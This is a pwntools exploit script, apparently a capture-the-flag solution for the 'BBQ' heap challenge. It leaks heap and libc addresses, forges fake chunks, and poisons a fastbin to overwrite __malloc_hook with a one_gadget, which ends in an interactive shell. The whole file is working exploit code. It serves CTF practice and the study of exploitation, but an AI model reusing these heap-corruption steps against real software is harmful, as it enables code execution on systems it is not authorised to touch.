from pwn import *

local=0
pc='/tmp/pwn/BBQ_debug'
remote_addr="pwn1.chal.ctf.westerns.tokyo"
remote_port=21638
aslr=True

libc=ELF('./libc.so.6')
#libc=ELF('/lib/x86_64-linux-gnu/libc-2.23.so')
#libc=ELF('/lib/i386-linux-gnu/libc-2.23.so')
context.log_level=True
if local==1:
    #p = process(pc,aslr=aslr)
    p = process(pc,aslr=aslr,env={'LD_PRELOAD': './libc.so.6'})
    gdb.attach(p,'c')
else:
    p=remote(remote_addr,remote_port)

ru = lambda x : p.recvuntil(x)
sn = lambda x : p.send(x)
rl = lambda   : p.recvline()
sl = lambda x : p.sendline(x) 
rv = lambda x : p.recv(x)
sa = lambda a,b : p.sendafter(a,b)
sla = lambda a,b : p.sendlineafter(a,b)

def lg(s,addr):
    print('\033[1;31;40m%20s-->0x%x\033[0m'%(s,addr))

def raddr(a=6):
    if(a!=0):
        return u64(rv(a).ljust(8,'\x00'))
    else:
        return u64(rl().strip('\n').ljust(8,'\x00'))

def choice(idx):
    sla("Choice: ",str(idx))

def buy(name,amount):
    choice(1)
    sla(">> ",name)
    sla(">> ",str(amount))

def grill(name,idx):
    choice(2)
    sla(">> ",name)
    sla(">> ",str(idx))

def eat(idx):
    choice(3)
    sla(">> ",str(idx))

if __name__ == '__main__':
    name='x'*0x10+p64(0xDEADBEEF11)[:5]
    buy('A'*(62-0x20),123)
    buy(p64(0xDEADBEEF11),0xe1)
    buy(name,123)
    grill(name,0)
    grill(name,1)
    eat(0)
    eat(1)
    buy('C'*39,123)
    eat(5)
    choice(1)
    ru("* ")
    ru("* ")
    heap_addr=raddr(6)-0x110
    lg("heap_addr",heap_addr)
    sla(">> ","Beef")
    sla(">> ",str(1))
    buy('C'*40+p64(heap_addr+0xb0),123)
    eat(5)
    buy(p64(heap_addr+0xd0),123)
    choice(1)
    ru("121")
    ru("* ")
    libc_addr=raddr(6)-0x3c4b78
    libc.address=libc_addr
    lg("Libc address",libc_addr)
    sla(">> ","Beef")
    sla(">> ",str(1))


    # create a 0x21 above malloc hook
    buy(p64(libc.symbols['__malloc_hook']-0x18),123)
    choice(1)
    k=ru('food na').split(' ')
    code=k[-3]
    num=(int(k[-2].split('\n')[0][1:-1]))
    left=0x100000000-num-0x1
    sla(">> ",code)
    sla(">> ",str(0x1))
    while(left>0):
        if(left<0x7FFFFFFF):
            buy(code,left+0x21)
            break
        else:
            buy(code,0x7FFFFFFF)
            left-=0x7FFFFFFF
    buy(p64(heap_addr+0xd0),123)
    buy(p64(heap_addr+0x10),123)

    buy('a'*0x10+p64(0xDEADBEEF11),0x31)
    buy(p64(0xDEADBEEF11),0x31)
    buy('fuck1',0x31)
    buy('C'*40+p64(heap_addr+0x1e0),123)
    eat(5)
    grill('Beef',0)
    eat(0)

    
    # fake a food structure in main_arena
    buy(p64(0xDEADBEEF11),0xb1)
    buy('k'*0x2+p64(heap_addr+0x10),123)
    buy('c'*0x1+p64(0xDEADBEEF11),123)
    buy(p64(libc.symbols['__malloc_hook']+0x10),123)
    buy('C'*40+p64(heap_addr+0x2c0),123)
    eat(5)
    buy("H"*0x10+p64(heap_addr+0x390),123)
    grill('',0)
    eat(0)


    ## modify fastbin[1]'s first pointer to point to a little above malloc hook
    left=0x100000000-0x210
    while(left>0):
        if(left<0x7FFFFFFF):
            buy(p64(heap_addr+0x150),left)
            break
        else:
            buy(p64(heap_addr+0x150),0x7FFFFFFF)
            left-=0x7FFFFFFF

    
    grill("H"*0x10+p64(heap_addr+0x390),1)
    eat(1)
    oneshot=libc.address+0x4526a
    buy(cyclic(0x8)+p64(oneshot),123)
    grill(p64(heap_addr+0x150).ljust(64,'\x00'),1)
    p.interactive()
